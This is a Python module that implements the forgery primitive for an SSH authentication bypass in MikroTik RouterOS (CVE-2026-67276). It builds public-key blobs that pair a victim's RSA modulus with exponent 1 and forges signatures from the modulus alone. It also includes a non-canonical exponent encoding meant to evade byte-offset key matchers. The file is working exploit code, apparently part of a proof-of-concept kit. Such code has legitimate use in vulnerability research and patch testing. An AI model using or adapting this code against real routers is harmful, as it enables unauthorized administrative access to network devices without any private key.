"""
forge_67276.py - CVE-2026-67276 (MikroTrick) client-side forgery primitive.

Mechanism (CERT PL disclosure, https://cert.pl/en/posts/2026/09/mikrotik-routeros-cve/):
    RouterOS SSH userauth matches the presented public-key blob against the
    authorized key by (key type, modulus) and OMITS the exponent. Signature
    verification then uses the exponent from the *client-supplied* blob.

    => present {ssh-rsa, e=1, n=victim modulus}: verification computes
       sig^1 mod n == sig, so the "signature" is simply the EMSA-PKCS1-v1_5
       block of the authentication data - constructible by anyone who knows n.

Pure stdlib. No network I/O here: this module is the primitive; poc_67276.py
is the SSH client using it.
"""

import base64
import hashlib
import struct

# SSH signature algorithm -> hash algorithm (RFC 8332)
SIG_HASH = {
    "ssh-rsa": "sha1",
    "rsa-sha2-256": "sha256",
    "rsa-sha2-512": "sha512",
}

# ASN.1 DigestInfo prefixes, RFC 8017 section 9.2 note 1, keyed by sig alg
_DIGEST_INFO = {
    "ssh-rsa": bytes.fromhex("3021300906052b0e03021a05000414"),
    "rsa-sha2-256": bytes.fromhex("3031300d060960864801650304020105000420"),
    "rsa-sha2-512": bytes.fromhex("3051300d060960864801650304020305000440"),
}


def _string(b: bytes) -> bytes:
    return struct.pack(">I", len(b)) + b


def _mpint(i: int) -> bytes:
    if i == 0:
        body = b""
    else:
        body = i.to_bytes((i.bit_length() + 7) // 8, "big")
        if body[0] & 0x80:
            body = b"\x00" + body
    return struct.pack(">I", len(body)) + body


def emsa_pkcs1_v15(data: bytes, sig_alg: str, k: int) -> bytes:
    """RFC 8017 section 9.2 EMSA-PKCS1-v1_5, hash bound to the SSH sig alg."""
    digest = hashlib.new(SIG_HASH[sig_alg], data).digest()
    t = _DIGEST_INFO[sig_alg] + digest
    ps = b"\xff" * (k - len(t) - 3)
    if len(ps) < 8:
        raise ValueError(f"RSA modulus too small for {sig_alg} ({k * 8} bits)")
    return b"\x00\x01" + ps + b"\x00" + t


def parse_openssh_rsa_pubkey(text_or_blob):
    """Parse 'ssh-rsa AAAA... comment' / authorized_keys lines, or a raw blob.

    Returns (n, e, comment)."""
    data = text_or_blob
    if isinstance(data, str):
        parts = data.strip().split(None, 2)
        if len(parts) < 2 or parts[0] != "ssh-rsa":
            raise ValueError("not an ssh-rsa public key line")
        blob = base64.b64decode(parts[1])
        comment = parts[2] if len(parts) > 2 else ""
    elif data[:7] in (b"ssh-rsa ", b"ssh-rsa\t"):
        parts = bytes(data).decode().strip().split(None, 2)
        if len(parts) < 2:
            raise ValueError("not an ssh-rsa public key line")
        blob = base64.b64decode(parts[1])
        comment = parts[2] if len(parts) > 2 else ""
    else:
        blob, comment = bytes(data), ""

    offset = 0

    def read_string():
        nonlocal offset
        (length,) = struct.unpack_from(">I", blob, offset)
        offset += 4
        value = blob[offset : offset + length]
        offset += length
        return value

    if read_string() not in {a.encode() for a in SIG_HASH}:
        raise ValueError("blob key type mismatch / not an SSH RSA blob")
    e = int.from_bytes(read_string(), "big")
    n = int.from_bytes(read_string(), "big")
    return n, e, comment


def forged_public_blob(sig_alg: str, n: int, exp_bytes: bytes = b"\x01") -> bytes:
    """string sig_alg, mpint e, mpint n - victim modulus, attacker exponent.

    exp_bytes is the RAW mpint body for the exponent. Default b"\\x01" is the
    canonical encoding of e=1. b"\\x00\\x00\\x01" is the non-canonical
    3-byte encoding (same value) that aligns field widths with a stored
    e=65537 key - useful against matchers that skip fields by byte offset."""
    return _string(sig_alg.encode()) + _string(exp_bytes) + _mpint(n)


def forged_signature(data: bytes, sig_alg: str, n: int) -> bytes:
    """SSH signature blob: string sig_alg, mpint sig, where sig is the raw
    EMSA block (valid iff the verifier uses the client-supplied exponent)."""
    k = (n.bit_length() + 7) // 8
    block = emsa_pkcs1_v15(data, sig_alg, k)
    return _string(sig_alg.encode()) + _mpint(int.from_bytes(block, "big"))


def verify_pkcs1(n: int, e: int, sig: int, data: bytes, sig_alg: str) -> bool:
    """RFC 8017 section 8.2.2 RSASSA-PKCS1-V1_5-VERIFY (reference impl).

    Used by selftest.py to simulate exactly what a server performs with a
    given exponent."""
    k = (n.bit_length() + 7) // 8
    if not 0 < sig < n:
        return False
    em = pow(sig, e, n).to_bytes(k, "big")
    try:
        return em == emsa_pkcs1_v15(data, sig_alg, k)
    except ValueError:
        return False
